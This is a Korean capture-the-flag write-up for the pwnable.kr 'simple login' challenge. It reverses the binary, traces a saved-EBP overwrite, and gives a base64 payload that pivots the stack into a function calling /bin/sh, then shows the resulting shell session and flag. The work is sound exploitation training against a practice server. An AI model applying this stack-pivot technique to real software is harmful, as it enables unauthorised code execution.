# simple login - 50 pt

## 문제

```text
Can you get authentication from this server?

Download : http://pwnable.kr/bin/login

Running at : nc pwnable.kr 9003
```

링크를 들어가면 9003번 포트에 열린 프로그램 바이너리를 다운받을 수 있다.

## 풀이

일단 열심히 바이너리 어셈 보고 핸드레이를 해봤다.

```c
int main()
{
    0x80482e0([esp+0x1e], 0, 0x1e);
    setvbuf(ds:0x811b860, 0, 2, 0);
    setvbuf(ds:0x811b864, 0, 1, 0);
    printf("Authenticate : ");
    scanf("%30s", [esp+0x1e]);
    0x80482e0(input,0,12);
    [esp+0x18] = 0;
    [esp+0x3c] = Base64Decode([esp+0x1e], [esp+0x18]);
    if ([esp+0x3c] <= 12) {
        memcpy(input, [esp+0x18], [esp+0x3c]);
        if (auth([esp+0x3c]) == 1)
            correct();
    } else {
        printf("Wrong Length");
    }
    return 0;
}

int auth() {
    memcpy([ebp-0x14]+0xc, input, [ebp+0x8]);
    [ebp-0xc] = calc_md5([ebp-0x14]);
    printf("hash : %s\n", [ebp-0xc]);
    if(0x80482f0("f87cd601aa7fedca99018a8be88eda34", [ebp-0xc]))
        return 1;
    else
        return 0;
}

void correct() {
    if (input == 0xdeadbeef) {
        puts("Congratulation! you are good!");
        system("/bin/sh");
    }
    exit(0);
}
```

프로그램의 동작은 다음과 같다.

1. `Authenticate : `를 출력하고, 사용자 입력값을 받아서 `BASE64`로 디코딩한다.
2. 만약 디코딩한 데이터의 길이가 12를 넘으면 `Wrong Length`를 출력하고 죽는다.
3. 디코딩한 데이터를 bss 영역에 있는 input에 집어 넣는다.
4. input 값의 `MD5`로 해슁한 후 `f87cd601aa7fedca99018a8be88eda34` 값과 다를경우 죽는다.
5. 위의 값과 같으면 input의 처음 4바이트가 `0xdeadbeef`면 클리어!

말이 쉽지 위의 조건을 모두 충족시키는 건 불가능하다. 왜냐하면 일단 같은 값을 줘도 출력하는 해쉬값이 다르다. 그게 웃긴게 input 값을 해슁한 값이 아니라 input 앞 영역을 해슁하는 겨여서 실행할 때 마다 차이가 있는 것 같다. 아니 근데 아직도 모르겠는데 `PIE`도 적용이 안되있는데 왜 값이 변하는 걸까 1도 모르겠다.

프로그램을 자꾸 돌리다 보면 알수 있을텐데 `BASE64`로 디코딩 했을때 나오는 데이터의 길이가 12인 경우 Segmentation Fault가 발생하면서 죽는다. 왜 그런지 core 파일을 한번 봤는데...

```bash
jhyun@ubuntu:~/Desktop$ ./login
Authenticate : 776t3kFCQ0RFRkdI             // '\xef\xbe\xad\xdeABCDEFGH'
hash : 3c34e1d6e48aeb734ee932ee3789ed0a
Segmentation fault (core dumped)
jhyun@ubuntu:~/Desktop$ gdb -c core login
...
 EBP  0x48474645 ('EFGH')
 ESP  0xffc833c0 ◂— 0xc /* '\x0c' */
───────────[ DISASM ]───────────
 ► 0x8049424 <main+279>        leave
   0x8049425 <main+280>        ret
```

잘 보면 `leave`에서 프로그램이 죽었고, `EBP`값이 내가 입력한 값의 맨 마지막 4바이트로 되어있는 것을 볼 수 있었다. `leave` 명령어는 `mov esp, ebp`와 `pop ebp`를 묶어 놓은 결과다. 여기서 죽었다는 것으로 보아하니, `EBP`값 (0x48474645 ('EFGH'))을 `ESP`에 넘겨주고 `POP`을 하려니까 되도않는 `0x48474645` 메모리 영역을 접근하려다 세그폴트나서 죽은것이다. 그 말인 즉슨, 우리가 마음대로 실행흐름을 바꿀수 있다는 것이다...

```python
# 0xdeadbeef + correct 함수 주소 (0x804925f) + input 영역 주소 (0x811eb40) 
base64.b64encode("\xef\xbe\xad\xde\x5f\x92\x04\x08\x40\xeb\x11\x08")
```

우리가 입력하는 위의 페이로드는 bss 영역의 `input` 영역에 저장되게 된다. 이런 식으로 프로그램에 입력을 주면, `leave`의 `mov esp, ebp`에 의해 `ESP`가 `input`영역 맨 앞으로 떨어지고, `pop ebp`에 의해 `input` 영역의 첫 4바이트 (0xdeadbeef)가 `EBP`에 떨어지게 된다. 그 다음 `ret`의 `pop eip`에 의해 `EIP`에 `correct` 함수 주소가 떨어지게 되고 `jmp eip`에 의해 `correct`함수로 실행흐름을 바꿀수 있게 된다! 뭐 그다음 `correct`함수 인증 루틴은 `0xdeadbeef`덕에 알아서 통과하게 된다.

```bash
jhyun@ubuntu:~/Desktop$ nc pwnable.kr 9003
Authenticate : 776t3l+SBAhA6xEI
hash : d65ac37256a4ac7c8bb309b4ad5aa131
Congratulation! you are good!
> ls
flag
log
simplelogin
super.pl
> cat flag
control EBP, control ESP, control EIP, control the world~
```